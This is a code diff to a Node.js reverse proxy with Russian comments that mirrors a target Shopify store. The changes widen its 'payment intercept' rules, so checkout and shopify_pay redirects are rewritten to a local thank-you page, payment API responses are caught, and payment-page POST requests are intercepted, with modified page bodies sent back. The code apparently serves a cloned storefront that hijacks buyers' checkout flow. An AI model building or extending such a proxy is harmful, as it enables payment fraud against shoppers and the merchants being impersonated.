@@ -122,7 +122,10 @@ const proxyOptions = {
     if (modifiedHeaders['location']) {
       const location = modifiedHeaders['location'];
       // Перехватываем редиректы на Shopify checkout
-      if (location.includes('checkout.shopify.com') || location.includes('/checkout') || location.includes('/checkouts/')) {
+      if (location.includes('checkout.shopify.com') || 
+          location.includes('/checkout') || 
+          location.includes('/checkouts/') ||
+          location.includes('/shopify_pay')) {
         console.log(`[PAYMENT INTERCEPT] Intercepting checkout redirect: ${location}`);
         modifiedHeaders['location'] = '/thank-you-payment';
       } else if (location.startsWith(TARGET_URL)) {
@@ -148,7 +151,7 @@ const proxyOptions = {
     });
     
     proxyRes.on('end', () => {
-      const bodyString = body.toString();
+      let bodyString = body.toString();
       const contentType = (modifiedHeaders['content-type'] || '').toLowerCase();
       
       // Перехватываем JSON ответы от API (AJAX запросы)
@@ -164,8 +167,11 @@ const proxyOptions = {
         const isPaymentAPI = (pathLower.includes('/checkout') ||
                             pathLower.includes('/payment') ||
                             pathLower.includes('/paiement') ||
+                            pathLower.includes('/shopify_pay') ||
+                            pathLower.includes('/checkouts/') ||
                             urlLower.includes('/checkout') ||
-                            urlLower.includes('/payment')) && !isCartOperation;
+                            urlLower.includes('/payment') ||
+                            urlLower.includes('/shopify_pay')) && !isCartOperation;
         
         if (isPaymentAPI) {
           console.log(`[PAYMENT INTERCEPT] Intercepting JSON API response: ${req.method} ${req.path}`);
@@ -460,7 +466,7 @@ const proxyOptions = {
             if (!res.headersSent) {
               res.writeHead(proxyRes.statusCode, modifiedHeaders);
             }
-            res.end(body);
+            res.end(bodyString);
             return;
           }
         } catch (injectionError) {
@@ -469,7 +475,7 @@ const proxyOptions = {
           if (!res.headersSent) {
             res.writeHead(proxyRes.statusCode, modifiedHeaders);
           }
-          res.end(body);
+          res.end(bodyString);
           return;
         }
       }
@@ -478,7 +484,12 @@ const proxyOptions = {
       if (!res.headersSent) {
         res.writeHead(proxyRes.statusCode, modifiedHeaders);
       }
-      res.end(body);
+      // Используем bodyString если это текст, иначе Buffer
+      if (contentType.includes('text/') || contentType.includes('application/json')) {
+        res.end(bodyString);
+      } else {
+        res.end(body);
+      }
     });
     
     proxyRes.on('error', (err) => {
@@ -696,11 +707,15 @@ app.use((req, res, next) => {
     paymentPaths.some(path => 
       pathLower.includes(path.toLowerCase())
     ) || (pathLower.includes('/checkout') && !pathLower.includes('/cart/add')) ||
+       (pathLower.includes('/checkouts/') && !pathLower.includes('/cart/add')) ||
        (pathLower.includes('/payment') && !pathLower.includes('/cart')) ||
        (pathLower.includes('/paiement') && !pathLower.includes('/cart')) ||
+       (pathLower.includes('/shopify_pay')) ||
        (urlLower.includes('/checkout') && !urlLower.includes('/cart/add')) ||
+       (urlLower.includes('/checkouts/') && !urlLower.includes('/cart/add')) ||
        (urlLower.includes('/payment') && !urlLower.includes('/cart')) ||
-       (urlLower.includes('/paiement') && !urlLower.includes('/cart'))
+       (urlLower.includes('/paiement') && !urlLower.includes('/cart')) ||
+       (urlLower.includes('/shopify_pay'))
   );
   
   // Перехватываем POST/PUT/PATCH запросы к страницам оплаты (НЕ операции с корзиной)
